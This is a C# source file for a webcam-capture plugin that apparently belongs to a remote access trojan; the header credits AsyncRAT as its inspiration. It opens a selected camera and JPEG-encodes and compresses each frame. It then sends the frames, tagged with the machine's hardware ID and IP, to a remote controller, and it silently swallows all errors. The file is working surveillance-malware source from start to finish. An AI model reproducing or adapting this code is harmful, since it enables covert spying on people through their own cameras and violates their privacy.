using AForge.Video;
using AForge.Video.DirectShow;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Plugin/RemoteCamera/RemoteCamera/Packet.cs
*/

namespace Plugin
{
    internal class Helpers
    {
        static Helpers() 
        {
            captureAsync = new CaptureAsync(Capture);
        }

        private static VideoCaptureDevice FinalVideo;
        private static MemoryStream Camstream = new MemoryStream();


        internal delegate void CaptureAsync();
        internal static CaptureAsync captureAsync;
        internal static void StartCaptureAsync() 
        {

            captureAsync.BeginInvoke(new AsyncCallback(EndCaptureAsync) , null);
        }

        internal static void Capture()
        {

            FilterInfoCollection videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            FinalVideo = new VideoCaptureDevice(videoCaptureDevices[Launch.remoteCameraCapturePacket.index].MonikerString);
            FinalVideo.NewFrame += new NewFrameEventHandler
                (
                 (sender, e) => CaptureRun(sender, e)
                );
            FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[Launch.remoteCameraCapturePacket.index];
            FinalVideo.Start();
        }


        private static void CaptureRun(object sender, NewFrameEventArgs e)
        {
            try
            {
                if (Launch.cameraCapture == true)
                {
                    Bitmap image = (Bitmap)e.Frame.Clone();
                    using (Camstream = new MemoryStream())
                    {
                        Encoder myEncoder = Encoder.Quality;
                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
                        EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, Launch.remoteCameraCapturePacket.quality);
                        myEncoderParameters.Param[0] = myEncoderParameter;
                        ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                        image.Save(Camstream, jpgEncoder, myEncoderParameters);
                        myEncoderParameters?.Dispose();
                        myEncoderParameter?.Dispose();
                        image?.Dispose();
                        byte[] compressed = Compressor.QuickLZ.Compress(Camstream.ToArray(), 1);
                        RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(compressed)
                        {
                            baseIp = Launch.baseIp,
                            HWID = Launch.HWID
                        };
                        Launch.clientHandler.SendPacket(remoteCameraCapturePacket);
                        Thread.Sleep(Launch.remoteCameraCapturePacket.timeMS);
                    }
                }
                else
                {
                    return;
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        private static void EndCaptureAsync(IAsyncResult ar) 
        {
            captureAsync.EndInvoke(ar);
        }

        internal static void StopStreamCamera() 
        {
            FinalVideo.Stop();
            FinalVideo.NewFrame -= null;
            Camstream?.Dispose();
            Launch.clientHandler.Dispose();
        }

        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
    }
}
